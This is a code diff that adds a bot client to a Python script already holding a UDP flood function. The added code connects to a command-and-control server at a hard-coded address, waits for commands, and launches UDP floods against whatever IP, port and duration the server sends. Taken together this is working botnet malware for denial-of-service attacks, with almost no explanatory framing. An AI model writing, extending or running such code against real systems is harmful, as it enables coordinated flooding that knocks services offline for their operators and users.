@@ -25,3 +25,46 @@ def udp_flood(target_ip, target_port, duration):
             print(f"Error: {e}")  # Handle any errors during packet sending
 
     print(f"UDP flood finished. Total amount of packets sent: {packet_count}")
+
+
+# Manage connection to the command control server.
+def bot():  # Actice socket (Active endpoint)
+    server_ip = "192.168.1.136"  # IP address of the control server
+    server_port = 54321  # Port number of the control server
+
+    while True:
+        try:
+            print(f"Connecting to server at {server_ip}:{server_port}")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket using IPv4 and TCP.
+            s.connect((server_ip, server_port))  # Connect to the server
+
+            while True:
+                # Receive a command from the server and decodes it.
+                command = s.recv(1024).decode()
+                print(f"Command to be executed the from server: {command}")
+
+                # Exit if the server sends the "exit" command
+                if command.lower() == "exit":
+                    print("Terminating bot.")
+                    break
+
+                # Handle UDP flood command logic
+                if command.startswith("udp_flood"):
+                    # Parse the command arguments i.e ("udp_flood <ip> <port> <duration>")
+                    _, target_ip, target_port, duration = command.split()
+                    # ignore udp_flood var, we only want the target ip and port for sending data.
+                    udp_flood(target_ip, int(target_port), int(duration))  # Execute UDP flood method.
+                else:
+                    break
+                    # we only have 1 command right now.
+
+            s.close()  # Terminate the TCP socket when exiting
+            break
+        except Exception as e:
+            print(f"ERROR!: {e}")  # Handle any errors during connection or execution
+            break
+
+
+# Entry point for the bot script
+if __name__ == "__main__":
+    bot()
